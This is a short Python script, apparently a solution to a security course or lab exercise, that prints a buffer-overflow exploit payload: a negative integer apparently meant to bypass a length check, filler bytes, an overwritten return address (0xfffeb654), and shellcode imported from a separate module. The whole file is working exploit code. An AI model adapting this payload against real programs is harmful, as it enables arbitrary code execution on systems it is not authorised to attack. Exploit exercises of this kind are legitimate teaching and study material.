#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(pack("<i", -1))
sys.stdout.buffer.write(b"0"*16)
sys.stdout.buffer.write(pack("<I", 0xfffeb654))
sys.stdout.buffer.write(shellcode)
